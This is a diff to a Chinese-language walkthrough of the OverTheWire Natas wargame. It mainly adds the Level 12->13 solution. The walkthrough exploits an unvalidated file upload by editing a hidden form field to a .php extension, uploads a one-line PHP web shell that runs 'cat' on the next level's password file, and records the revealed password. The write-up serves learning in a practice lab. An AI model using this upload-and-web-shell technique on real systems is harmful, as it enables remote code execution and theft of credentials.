@@ -568,7 +568,7 @@ if($data["showpassword"] == "yes") {
     所以将明文和密文进行异或运算即可得到密钥  
     ```
 
-    > 可参考内容：
+    > 可参考内容：  
     > [关于异或加密](https://ruanyifeng.com/blog/2017/05/xor.html)  
     > [关于异或运算](https://blog.csdn.net/xiaopihaierletian/article/details/78162863)  
 
@@ -604,11 +604,11 @@ if($data["showpassword"] == "yes") {
     echo "Calculated Key is: " . $wrongKey . "<br>";
     ```
 
-    > 输出：
-    > Key is : 123
-    > Text is : 1234567890
-    > CipherText is:  
-    > Calculated Key is: 1231231231
+    > 输出：  
+    > Key is : 123  
+    > Text is : 1234567890  
+    > CipherText is:    
+    > Calculated Key is: 1231231231  
 
 
 
@@ -621,9 +621,101 @@ YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 
 ## Level 12 -> Level 13
 
+> 页面内容：  
+> Choose a JPEG to upload (max 1KB):  
+> 选择文件按钮  
+> 上传文件按钮  
+> 还有一个查看源码
+
+看下面源码写的注释（（  
+
+```php
+<?php
+// 就是个生成随机字符串的函数，不重要，细节略
+function genRandomString() {
+}
+// 这个函数会根据传入的目录名$dir变量和扩展名$ext变量，将它们中间缝合一个随机字符串，生成一个路径
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+// 这个函数主要就是用来获取目录和扩展名，依靠pathinfo读取$fn代表的文件获取扩展名
+// 然后用得到的目录和扩展名调用上面那个函数
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+// 下面两行通过内置的"upload"确定了调用上面那个函数时传入的目录名
+// 同时还获取了POST发送的表单的值，具体对应的就是含有`name="filename"`这一段的那个input元素
+// 这个input是隐藏的它的值决定了上传文件后，文件的路径的扩展名
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+
+```html
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+```
+
+**分析**
+
+综上，可以看到源码没有直接写什么条件下会显示密码  
+所以思路应该是主动去查看密码，或者找密码是或藏在别处  
+但是这次没提示，“该页面什么也没有”，所以应该是主动尝试查看密码  
+那么方法也就是尝试看这个文件：`/etc/natas_webpass/natas13`  
+然后，根据上面对源码的分析，可以知道能通过修改隐藏的input元素值来修改上传文件后显示的扩展名  
+再者这个文件上传除了大小，根本没过滤其他的，完全可以传一个php文件上去，然后执行访问php文件执行查看密码的命令  
+`cat /etc/natas_webpass/natas13`  
+
+**具体过程**
+
+先准备一个php文件，内容如下：  
+
+```php
+<?php
+echo shell_exec("cat /etc/natas_webpass/natas13");
+?>
+```
+
+然后在natas12的页面打开浏览器的开发工具，检查元素，找到这个元素  
+`<input type="hidden" name="filename" value="s49vthjlil.jpg">`  
+
+> value的值每次都不一样，不重要  
+
+接下来把`hidden`删了，页面上就会多一个输入框，把里面的内容，扩展名从jpg改为php  
+然后上传准备好的php文件  
+接下来页面会变成这样  
+
+> The file upload/e0m8v73mfy.php has been uploaded  
+
+点开链接就看到密码了  
+好，搞了两个小时多  
+
+
 ### 密码
 
 ```
+lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 ```
 
 ## Level 13 -> Level 14
